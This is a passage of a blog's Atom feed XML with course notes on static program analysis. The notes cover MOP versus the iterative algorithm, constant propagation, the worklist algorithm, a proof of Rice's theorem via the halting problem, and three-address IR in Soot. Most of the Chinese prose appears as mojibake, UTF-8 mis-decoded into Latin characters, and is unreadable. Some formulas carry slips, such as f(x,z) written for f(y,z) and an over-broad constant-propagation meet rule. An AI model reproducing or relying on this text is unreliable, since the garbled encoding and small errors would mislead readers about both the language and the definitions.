\sqcup f_{S_{3}}\left(f_{S_{2}}(\mathrm{OUT}[ Entry ])\right)$ï¼ˆæ³¨æ„$f_{s_3}$çš„ä½ç½®ï¼‰</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200814220329588.png" alt="image-20200814220329588" style="zoom:50%;"></p><h2 id="Iterative-Algorithm-v-s-MOP"><a href="#Iterative-Algorithm-v-s-MOP" class="headerlink" title="Iterative Algorithm v.s. MOP"></a>Iterative Algorithm v.s. MOP</h2><p>MOPæ¯”Iterativeåˆ†ææ›´ç²¾ç¡®ï¼Œä¹Ÿå°±æ˜¯è¯´è·¯å¾„æ•æ„Ÿæ¯”æ•æ„Ÿæ›´ç²¾ç¡®ï¼Œä¸‹é¢ä¸ºè¯æ˜ï¼ˆè¿™é‡Œåªéœ€è¯æ˜ä¸¤æ¡è·¯å¾„çš„æƒ…å†µï¼Œå…¶å®ƒæ•°å½’å³å¯ï¼‰ï¼š</p><p>ç”± $\sqcup$ çš„å®šä¹‰å¾— $\mathrm{x} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$ ä¸” $\mathrm{y} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$ï¼›</p><p>å› ä¸º $F$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤æœ‰ $F(x) \sqsubseteq F(x \sqcup y)$ ä¸” $F(y) \sqsubseteq F(x \sqcup y)$ï¼›</p><p>å› æ­¤$F(x\sqcup y)$ æ˜¯ $F(x)$ å’Œ $F(y)$ çš„ä¸Šç•Œï¼›</p><p>åˆå› ä¸º$F(x)\sqcup F(y)$æ˜¯ $F(x)$ å’Œ $F(y)$ çš„æœ€å°ä¸Šç•Œï¼›</p><p>å› æ­¤ $ F(x) \sqcup F(y) \sqsubseteq F(x\sqcup y)$ï¼Œå³$MOP \sqsubseteq Ours$ã€‚</p><p>ç„¶è€Œï¼Œå½“Fæ˜¯distributiveï¼ˆFæ»¡è¶³åˆ†é…ç‡ï¼‰æ—¶ï¼ŒInterativeå’ŒMOPä¸€æ ·å‡†ç¡®ã€‚</p><p>BitVectoræˆ–æ˜¯Gen/Killé—®é¢˜ï¼ˆset union/intersection for join/meetï¼‰éƒ½æ˜¯æ»¡è¶³åˆ†é…ç‡çš„</p><h1 id="Constant-Propagation"><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h1><blockquote><p>Given a variable $x$ at program point p, determine whether $x$ is guaranteed to hold a constant value at $p$</p></blockquote><p>å¯¹äºåœ¨ç¨‹åºç‚¹ $p$ çš„ä¸€ä¸ªå˜é‡ $x$ï¼Œåˆ¤æ–­ $x$ æ˜¯å¦ä¸ºåœ¨ $p$ ç‚¹ä¸ºä¸€ä¸ªå¸¸é‡</p><p>åˆ†æç»“æœï¼šå¯¹äºæ¯ä¸€ä¸ªCFGèŠ‚ç‚¹ï¼Œå¯¹åº”ä¸€ä¸ª $(x,v)$ é›†åˆï¼Œ$x$ æ˜¯å˜é‡ï¼Œ$v$ æ˜¯ $x$ çš„å€¼</p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>Domainï¼š UNDEF â†’ {â€¦, -2, -1, 0, 1, 2, â€¦} â†’ NAC ï¼Œâ†’ è¡¨ç¤º $\sqsubseteq$ å…³ç³»</p><p>Meet Operator $\sqcap$ï¼š</p><ul><li>$\mathrm{NAC} \sqcap v= \mathrm{NAC}$</li><li>$\mathrm{UNDEF} \sqcap v= v$</li><li>$c \sqcap v= \mathrm{NAC}$ ï¼ˆc ä¸ºä¸€å¸¸é‡ï¼‰</li><li>$c \sqcap c= c$</li><li>$c_1 \sqcap c_2 = \mathrm{NAC}$</li></ul><h2 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h2><p>è®¨è®ºtransfer functionï¼Œå¯¹äºä¸€ä¸ªèµ‹å€¼è¯­å¥ <code>s: x= ...</code> æ¥è¯´ï¼Œå®šä¹‰å…¶ F ä¸º</p><script type="math/tex; mode=display">F: \mathrm{OUT}[s]=gen \cup(\mathrm{IN}[s]-\{(x, \_)\})</script><ul><li><code>s: x=c;</code>  $gen=\{(x,c)\}$</li><li><code>s: x=y;</code> $gen=\{(x, val(y))\}$</li><li><code>s: x=y op z;</code> $gen=\{(x, f(x,z))\}$ </li></ul><p>è€Œ $f(x,z)$ æœ‰ä¸‰ç§æƒ…å†µï¼š</p><script type="math/tex; mode=display">f(y,z)=\left\{\begin{array}{ll} val(y) \text { op } val(z) & \text {// if val(y) and val(z) are constants } \\ \text { NAC } & \text {//if val(y) or val(z) is NAC } \\\text { UNDEF } & \text {// otherwise } \\\end{array}\right.</script><h2 id="functionä¸æ»¡è¶³åˆ†é…æ€§"><a href="#functionä¸æ»¡è¶³åˆ†é…æ€§" class="headerlink" title="functionä¸æ»¡è¶³åˆ†é…æ€§"></a>functionä¸æ»¡è¶³åˆ†é…æ€§</h2><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ$F(X\sqcap Y)$ ä¸­Cçš„å€¼ä¸º<strong>NAC</strong>ï¼Œè€Œ$F(X) \sqcap F(Y)$ä¸­ C çš„å€¼ä¸º<strong>10</strong>ï¼Œå› æ­¤Fä¸æ»¡è¶³åˆ†é…æ€§ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200815173321586.png" alt="image-20200815173321586"></p><h1 id="Worklist-Algorithm"><a href="#Worklist-Algorithm" class="headerlink" title="Worklist Algorithm"></a>Worklist Algorithm</h1><p>Iterative Algorithmçš„ä¼˜åŒ–ï¼ŒIterative å­˜åœ¨å†—ä½™çš„è®¡ç®—ï¼Œè€ŒWorkliståªè®¡ç®—æœ‰å˜åŒ–çš„nodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OUT[entry] =âˆ…;</span><br><span class="line"><span class="keyword">for</span>(each basic block B\entry) </span><br><span class="line">OUT[B] =âˆ…;</span><br><span class="line">    Worklistâ†all basic blocks</span><br><span class="line"><span class="keyword">while</span> (Worklist <span class="keyword">is</span> notempty) </span><br><span class="line">    Pick a basic block B <span class="keyword">from</span> Worklist</span><br><span class="line">old_OUT= OUT[B]</span><br><span class="line">        IN[B] =âŠ”OUT[P]; <span class="comment"># join/meet Pä¸ºBçš„å‰ç½®ä»£ç å—</span></span><br><span class="line">        OUT[B] = genB U (IN[B] - killB); <span class="comment"># transfer function </span></span><br><span class="line">        <span class="keyword">if</span>(old_OUTâ‰ OUT[B])</span><br><span class="line">        Add all successors of B to Worklis</span><br></pre></td></tr></table></figure><h1 id="åˆ†æç‰¹æ€§"><a href="#åˆ†æç‰¹æ€§" class="headerlink" title="åˆ†æç‰¹æ€§"></a>åˆ†æç‰¹æ€§</h1><ul><li>æµæ•æ„Ÿï¼šç¨‹åºè¯­å¥éšæ„è°ƒæ¢ä½ç½®ï¼Œåˆ†æç»“æœä¸å˜ä¸ºæµéæ•æ„Ÿï¼Œå¦åˆ™ä¸ºæµæ•æ„Ÿï¼›</li><li>è·¯å¾„æ•æ„Ÿï¼šè€ƒè™‘ç¨‹åºä¸­è·¯å¾„çš„å¯è¡Œæ€§ï¼›</li><li></li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚è¯¾ä¸»è¦ä»‹ç»æ ¼ï¼Œæ¥ç€ç”¨æ ¼æŠ½è±¡æè¿°æ•°æ®æµåˆ†æï¼Œè§£é‡Šä¸ºä»€ä¹ˆè¿­ä»£ç®—æ³•èƒ½å¤Ÿåˆ°è¾¾æœ€å¤§/æœ€å°ä¸åŠ¨ç‚¹ï¼Œæ¥ç€æ¯”è¾ƒäº†æµæ•æ„Ÿå’Œè·¯å¾„æ•æ„Ÿçš„å‡†ç¡®æ€§ï¼Œæœ€åä»‹ç»worklistç®—æ³•ï¼Œä»¥æå‡è¿­ä»£ç®—æ³•çš„æ•ˆç‡ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Iterative-Algorithm&quot;&gt;&lt;a href=&quot;#Iterative-Algorithm&quot; class=&quot;headerlink&quot; title=&quot;Iterative Algorithm&quot;&gt;&lt;/a&gt;Iterative Algorithm&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;å¯¹äºä¸€ä¸ªå« $k$ ä¸ªèŠ‚ç‚¹çš„CFGï¼Œæ¯ä¸ªè¿­ä»£ç®—æ³•å¯¹äºæ¯ä¸ªnode $n$ æ›´æ–°$\mathrm{OUT}[n]$ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å‡è®¾è¿­ä»£ç®—æ³•çš„ç ”ç©¶å¯¹è±¡ï¼ˆdomainï¼‰æ˜¯$V$ï¼Œå®šä¹‰ä¸€ä¸ªkå…ƒç»„&lt;br&gt;  &lt;script type=&quot;math/tex&quot;&gt;V^k=\left(\mathrm{OUT}\left[\mathrm{n}_{1}\right], \mathrm{OUT}\left[\mathrm{n}_{2}\right], \ldots, \mathrm{OUT}\left[\mathrm{n}_{\mathrm{k}}\right]\right)$ï¼Œ$V^k\in(V_1 \times V_2 \times \dots \times V_k)&lt;/script&gt;ï¼Œ&lt;br&gt;  $ V^k $ å³ä¸€æ¬¡è¿­ä»£äº§ç”Ÿçš„è¾“å‡ºï¼Œæ¯æ¬¡è¿­ä»£ä¼šæ›´æ–°$V^k$ï¼Œå¯ä»¥å°†æ¯æ¬¡è¿­ä»£ç»è¿‡transfer functionså’Œcontrol-flow handingçš„è¿‡ç¨‹æŠ½è±¡ä¸º$F: V^k\rightarrow {V^{k}}â€™$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å½“$V^k\rightarrow {V^{k}}â€™$æ—¶ï¼Œå³$X=F(X)$ ï¼Œç§°$F(x)$åœ¨$X$å¤„åˆ°è¾¾äº†&lt;strong&gt;ä¸åŠ¨ç‚¹&lt;/strong&gt;ï¼Œ$X$ä¸º$F(x)$çš„ä¸åŠ¨ç‚¹ï¼Œ&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="PL" scheme="http://anemone.top/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/</id>
    <published>2020-08-02T08:34:13.000Z</published>
    <updated>2020-10-03T04:03:43.605Z</updated>
    
    <content type="html"><![CDATA[<p>æ¯æ ¡è®¡ç®—æœºé™¢çš„ææ¨¾ã€è°­æ·»è€å¸ˆè®²çš„è¯¾ï¼Œå¬äº†ç¬¬ä¸€èŠ‚è¯¾å°±å“­äº†ï¼Œå†³å®šåšä¸€ä¸‹ç¬”è®°ï¼Œè¯¾ç¨‹ç½‘ç«™ <a href="https://pascal-group.bitbucket.io/teaching.htmlã€‚" target="_blank" rel="noopener">https://pascal-group.bitbucket.io/teaching.htmlã€‚</a></p><h1 id="PLçŸ¥è¯†ä½“ç³»"><a href="#PLçŸ¥è¯†ä½“ç³»" class="headerlink" title="PLçŸ¥è¯†ä½“ç³»"></a>PLçŸ¥è¯†ä½“ç³»</h1><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802113608162.png" alt="image-20200802113608162"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦åˆ†ä¸‰å¤§å—ï¼Œç†è®ºéƒ¨åˆ†åŒ…å«è¯­è¨€è®¾è®¡ã€ç±»å‹ç³»ç»Ÿã€è¯­ä¹‰å’Œé€»è¾‘æ£€æŸ¥ï¼›ç¯å¢ƒéƒ¨åˆ†åŒ…å«ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶è®¾è®¡ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åŒ…å«ç¨‹åºåˆ†æã€ç¨‹åºéªŒè¯å’Œç¨‹åºç”Ÿæˆç­‰ï¼Œæœ¬è¯¾ç¨‹ä¸»è¦å…³æ³¨äºåº”ç”¨æ–¹é¢çš„ç¨‹åºåˆ†æã€‚</p><a id="more"></a><h1 id="Riceâ€™s-Theoremï¼ˆè±æ–¯å®šç†ï¼‰"><a href="#Riceâ€™s-Theoremï¼ˆè±æ–¯å®šç†ï¼‰" class="headerlink" title="Riceâ€™s Theoremï¼ˆè±æ–¯å®šç†ï¼‰"></a>Riceâ€™s Theoremï¼ˆè±æ–¯å®šç†ï¼‰</h1><h2 id="åœæœºé—®é¢˜"><a href="#åœæœºé—®é¢˜" class="headerlink" title="åœæœºé—®é¢˜"></a>åœæœºé—®é¢˜</h2><p>äº†è§£è±æ–¯å®šç†ï¼Œé¦–å…ˆè¯æ˜åœæœºé—®é¢˜æ˜¯ä¸å¯åˆ¤å®šçš„ï¼š</p><ul><li><p>å‡è®¾å­˜åœ¨åœæœºé—®é¢˜çš„åˆ¤å®šç®—æ³• <code>bool Halt(p)</code>ï¼›</p></li><li><p>å­˜åœ¨æ¶æ„ç¨‹åºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Evil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Halt(Evil))</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>é‚£ä¹ˆ<code>Halt(Evil)</code>è¿”å›å­˜åœ¨çŸ›ç›¾ï¼š</p><ul><li>è‹¥è¿”å›çœŸï¼Œå³evilå¯åœæœºï¼Œé‚£ä¹ˆEvil()èµ°ifåˆ†æ”¯ï¼Œä½†è¯¥åˆ†æ”¯evilä¸å¯åœæœºï¼ŒçŸ›ç›¾ï¼›</li><li>è‹¥è¿”å›å‡ï¼Œå³evilä¸å¯åœæœºï¼Œé‚£ä¹ˆEvil()èµ°elseåˆ†æ”¯ï¼Œä½†è¿™æ ·evilå¯ä»¥åœæœºï¼ŒçŸ›ç›¾ã€‚</li></ul></li></ul><h2 id="å†…å­˜æ³„éœ²é—®é¢˜"><a href="#å†…å­˜æ³„éœ²é—®é¢˜" class="headerlink" title="å†…å­˜æ³„éœ²é—®é¢˜"></a>å†…å­˜æ³„éœ²é—®é¢˜</h2><p>å†…å­˜æ³„éœ²é—®é¢˜ä¸ä¹‹ç±»ä¼¼ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Evil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">malloc</span>();</span><br><span class="line">    <span class="keyword">if</span> (LeakFree(Evil))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Riceå®šç†"><a href="#Riceå®šç†" class="headerlink" title="Riceå®šç†"></a>Riceå®šç†</h2><p>ç»è¿‡ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ï¼Œå¯ä»¥æ„Ÿè§‰åˆ°åªè¦æ˜¯ä¸€ä¸ªåˆ¤å®šé—®é¢˜ï¼Œå°±å¯ä»¥å¥—ç”¨ä¸Šé¢çš„evilæ¡†æ¶æ¥åè¯è¿™ä¸ªæ¡†æ¶æ˜¯ä¸å¯åˆ¤å®šçš„ï¼ŒRiceå®šç†å¯¹ä¸Šé¢æƒ…å†µä½œäº†æ€»ç»“ï¼š</p><blockquote><p>Any non-trivial property of the behavior of programs in a i.e. language is undecidable.</p></blockquote><p>å¯¹é€’å½’å¯æšä¸¾è¯­è¨€æ¥è¯´ï¼Œä¸å­˜åœ¨ä¸€ä¸ªå®Œç¾ï¼ˆSound&amp;Completeï¼‰çš„ï¼Œç”¨äºåˆ¤å®šç¨‹åºä¸­non-trivialçš„å±æ€§çš„æ–¹æ³•ã€‚</p><p>è¿™é‡Œâ€œnon-trivial propertyâ€å¯ä»¥ç†è§£ä¸ºç¨‹åºåˆ†æçš„ç§ç§ç›®çš„ï¼Œå¦‚å˜é‡æ˜¯å¦ç©ºæŒ‡é’ˆã€æ˜¯å¦å­˜åœ¨ä¿¡æ¯æ³„éœ²ç­‰ã€‚</p><ul><li>å¹³å‡¡ï¼ˆtrivialï¼‰å±æ€§ï¼šå¯¹å›¾çµæœºï¼ˆè¯­è¨€ï¼‰Pæ¥è¯´ï¼Œè¦ä¹ˆå¯¹å…¨ä½“ç¨‹åºéƒ½ä¸ºçœŸï¼Œè¦ä¹ˆå¯¹å…¨ä½“ç¨‹åºéƒ½ä¸ºå‡ï¼›</li><li>éå¹³å‡¡ï¼ˆnon-trivialï¼‰å±æ€§ï¼šä¸æ˜¯å¹³å‡¡çš„æ‰€æœ‰å±æ€§ï¼Œå¦‚åœæœºé—®é¢˜ã€ç©ºæŒ‡é’ˆã€ä¿¡æ¯æ³„éœ²ç­‰ã€‚</li></ul><p><strong>è¯æ˜ï¼š</strong></p><p>è®¾ç»™å®šå‡½æ•°ä¸Šæœ‰éå¹³å‡¡æ€§è´¨Pï¼Œå‡è®¾ç©ºé›†ï¼ˆå¯¹ä»»ä½•è¾“å…¥éƒ½ä¸è¾“å‡ºçš„ç¨‹åºï¼ŒåŒ…æ‹¬ä¸åœæœºç¨‹åºï¼‰ä¸æ»¡è¶³Pï¼Œå› ä¸ºPéå¹³å‡¡ï¼Œå› æ­¤ä¸€å®šæœ‰æ»¡è¶³Pçš„ç¨‹åºok_progï¼›</p><p>å‡è®¾æœ‰åˆ¤å®šæ€§è´¨Pçš„ç®—æ³• <code>P_holds()</code>ï¼Œç¼–å†™ä»¥ä¸‹ç¨‹åºåˆ¤æ–­ç¨‹åºqæ˜¯å¦åœæœºï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Bool <span class="title">halt</span><span class="params">(Program q, Input w)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(Input x)</span> </span>&#123;</span><br><span class="line">        q(w);<span class="comment">//å¦‚æœqä¸åœæœºï¼Œé‚£ä¹ˆevilä¸æ»¡è¶³P</span></span><br><span class="line">    ok_prog(x); <span class="comment">//å¦‚æœqåœæœºï¼Œé‚£ä¹ˆå¯åŠ¨ok_progï¼Œæ­¤æ—¶evilç¨‹åºç­‰åŒäºokprogç¨‹åº</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> P_holds(evil);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸Šé¢ç¨‹åºå€Ÿç”¨äº†P_holdsçš„èƒ½åŠ›æ¥åˆ¤æ–­åœæœºé—®é¢˜ï¼Œå…³é”®åœ¨äºevilï¼š</p><ul><li><p>å¦‚æœ<code>q(w)</code>ä¸åœæœºï¼Œé‚£ä¹ˆå› ä¸ºä¸åœæœºç¨‹åºä¸æ»¡è¶³Pï¼Œ<code>evil()</code>ä¸æ»¡è¶³Pï¼›</p></li><li><p>å¦‚æœ<code>q(w)</code>åœæœºï¼Œé‚£ä¹ˆ<code>evil(x)</code>ç­‰åŒäº<code>ok_prog(x)</code>å³<code>evil(x)</code>æ»¡è¶³P</p></li></ul><p>ç»¼ä¸Šï¼Œåªè¦åˆ¤å®š<code>evil(x)</code>æ˜¯å¦æ»¡è¶³Pï¼Œå°±å¯åˆ¤å®šåœæœºé—®é¢˜ï¼Œä½†æ˜¯ä¹‹å‰å·²ç»è¯æ˜è¿‡ï¼Œåœæœºé—®é¢˜æ˜¯ä¸å¯åˆ¤å®šé—®é¢˜ï¼Œå› æ­¤çŸ›ç›¾ã€‚</p><p>æ³¨æ„ï¼Œå°†ç©ºé›†æè¿°ä¸ºæ»¡è¶³Pï¼Œä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹æ³•è¯æ˜ï¼ˆè®¾æœ‰ä¸æ»¡è¶³Pçš„ç¨‹åºno_progâ€¦ï¼‰</p><h1 id="å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness-amp-completenessï¼‰"><a href="#å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness-amp-completenessï¼‰" class="headerlink" title="å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness&amp;completenessï¼‰"></a>å¯é æ€§å’Œå®Œå¤‡æ€§ï¼ˆsoundness&amp;completenessï¼‰</h1><p>è±æ–¯å®šç†è¯´æ˜äº†ä¸å¯åˆ¤å®šæ€§ï¼Œåœ¨å®é™…åˆ†ææ—¶åªèƒ½åšmayæˆ–è€…mustçš„åˆ†æï¼Œåˆ†ææ—¶å‡ºç°soundå’Œcompleteæƒ…å†µï¼Œå­˜åœ¨ä¸¤ç§å¦¥åæ–¹æ¡ˆï¼š</p><ul><li>Compromise soundnessï¼šå¦¥åå¯é æ€§ï¼Œå³æ¥å—è¯¯æŠ¥ï¼ˆmayï¼‰ï¼Œè¯¥æ–¹æ¡ˆæ˜¯é™æ€åˆ†æè¾ƒå¸¸è§</li><li>Compromise completenessï¼šå¦¥åå®Œå¤‡æ€§ï¼Œå³æ¥å—æ¼æŠ¥ï¼ˆmustï¼‰</li></ul><p>è¯¯æŠ¥ï¼ˆFalse positiveï¼‰ä¸æ¼æŠ¥ï¼ˆFalse negativeï¼‰å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802115612020.png" alt="image-20200802115612020"></p><h1 id="ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹"><a href="#ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹" class="headerlink" title="ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹"></a>ç®€å•çš„ç¨‹åºåˆ†ææ¡ˆä¾‹</h1><p>åˆ†æåœ¨ä»£ç på¤„å˜é‡vçš„æ­£è´Ÿ(+, -, 0)ã€‚</p><h2 id="å®šä¹‰æ•°æ®æŠ½è±¡"><a href="#å®šä¹‰æ•°æ®æŠ½è±¡" class="headerlink" title="å®šä¹‰æ•°æ®æŠ½è±¡"></a>å®šä¹‰æ•°æ®æŠ½è±¡</h2><ul><li>$+$ï¼šæ­£</li><li>$-$ï¼šè´Ÿ</li><li>$0$ï¼šé›¶</li><li>$\top$ï¼šæœªçŸ¥</li><li>$\perp$ï¼šæœªå®šä¹‰</li></ul><h2 id="å®šä¹‰Transfer-Function"><a href="#å®šä¹‰Transfer-Function" class="headerlink" title="å®šä¹‰Transfer Function"></a>å®šä¹‰Transfer Function</h2><p>å³è¯»å–ä¸€ä¸ªäºŒå…ƒæ“ä½œstatementsï¼Œè¾“å‡ºç¬¦å·æ˜¯ä»€ä¹ˆï¼Œå¦‚ä¸‹è¡¨ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802154058197.png" alt="image-20200802154058197"></p><h2 id="å®šä¹‰Control-Flow-Merge"><a href="#å®šä¹‰Control-Flow-Merge" class="headerlink" title="å®šä¹‰Control Flow Merge"></a>å®šä¹‰Control Flow Merge</h2><p>åœ¨CFGä¸­æ±‡èšç‚¹ä¸­è¦åˆå¹¶æƒ…å†µ<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802154239519.png" alt="image-20200802154239519"></p><h1 id="ç¼–è¯‘å™¨vs-é™æ€åˆ†æå™¨"><a href="#ç¼–è¯‘å™¨vs-é™æ€åˆ†æå™¨" class="headerlink" title="ç¼–è¯‘å™¨vs.é™æ€åˆ†æå™¨"></a>ç¼–è¯‘å™¨vs.é™æ€åˆ†æå™¨</h1><ul><li><p>ç¼–è¯‘å™¨ï¼š<br>è¯æ³•åˆ†æï¼ˆäº§ç”Ÿtokensï¼‰â†’è¯­æ³•åˆ†æï¼ˆäº§ç”ŸASTï¼‰â†’è¯­ä¹‰åˆ†æï¼ˆåŒ…æ‹¬ç±»å‹æ£€æŸ¥ï¼Œäº§ç”ŸDecorated ASTï¼‰â†’ç¿»è¯‘ï¼ˆäº§ç”ŸIRï¼‰â†’ä»£ç ç”Ÿæˆ </p></li><li><p>é™æ€åˆ†æï¼š<br>é™æ€åˆ†æåŸºäºIR</p></li></ul><h1 id="ASTå’ŒIR"><a href="#ASTå’ŒIR" class="headerlink" title="ASTå’ŒIR"></a>ASTå’ŒIR</h1><h2 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h2><ol><li>ç¬¦åˆè¯­æ³•ç»“æ„</li><li>ä¾èµ–äºç‰¹å®šè¯­è¨€</li><li>é€‚åˆäºç±»å‹æ£€æŸ¥</li><li>ç¼ºå¤±æ§åˆ¶æµä¿¡æ¯</li></ol><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><ol><li>æ¥è¿‘æœºå™¨ä»£ç </li><li>è¯­è¨€æ— å…³</li><li>å«æœ‰æ§åˆ¶æµä¿¡æ¯</li></ol><h2 id="ä¸‰åœ°å€ç "><a href="#ä¸‰åœ°å€ç " class="headerlink" title="ä¸‰åœ°å€ç "></a>ä¸‰åœ°å€ç </h2><p>ä¸€ç§å¸¸ç”¨çš„IRï¼š</p><ol><li>å³ä¾§åªæœ‰ä¸€ä¸ªæ“ä½œ</li><li>æ¯ä¸€è¯­å¥æœ€å¤šæœ‰ä¸‰ä¸ªâ€œåœ°å€â€ï¼ˆåœ°å€å¯ä»¥æ˜¯å˜é‡ï¼Œå¸¸é‡ï¼‰<ul><li>$z=x\text{ }op\text{ }y$</li><li>$x=op\text{ }y$</li><li>$x=y$</li><li>$goto\text{ }L$</li><li>$if\text{ }x\text{ }goto\text{ }L$</li><li>$if\text{ }x\text{ }op\text{ }y\text{ }goto\text{ }L$</li></ul></li></ol><p>Soot ä¸­çš„ä¸‰åœ°å€ç :</p><ul><li><code>@parameter</code>ï¼šå‡½æ•°å‚æ•°</li><li><p><code>$x</code>ï¼šä¸´æ—¶å˜é‡</p></li><li><p><code>&lt;method signature&gt;</code>ï¼šç±»+è¿”å›å€¼ç±»å‹+æ–¹æ³•å+å‡½æ•°å‚æ•°ç±»å‹</p></li><li><code>&lt;init&gt;</code>ï¼šæ„é€ å‡½æ•°</li><li><code>&lt;clinit&gt;</code>ï¼šç±»åˆå§‹åŒ–å‡½æ•°ï¼ˆé™æ€å˜é‡åˆå§‹åŒ–ç­‰ï¼‰</li><li><code>invokespecial</code>ï¼šè°ƒç”¨æ„é€ å‡½æ•°ã€çˆ¶ç±»æ–¹æ³•ã€ç§æœ‰æ–¹æ³•</li><li><code>invokevirtual</code>ï¼šå®ä¾‹æ–¹æ³•è°ƒç”¨ï¼ˆvirtual dispatchï¼‰</li><li><code>invokeinterface</code>ï¼šä¸èƒ½ä¼˜åŒ–ã€è°ƒç”¨æ¥å£ã€æ£€æŸ¥æ¥å£å®ç°</li><li><code>invokestatic</code>ï¼šè°ƒç”¨é™æ€æ–¹æ³•</li><li><code>invokedynamic</code>ï¼šè¿è¡Œå…¶ä»–åŠ¨æ€è¯­è¨€ </li></ul><h2 id="SSA"><a href="#SSA" class="headerlink" 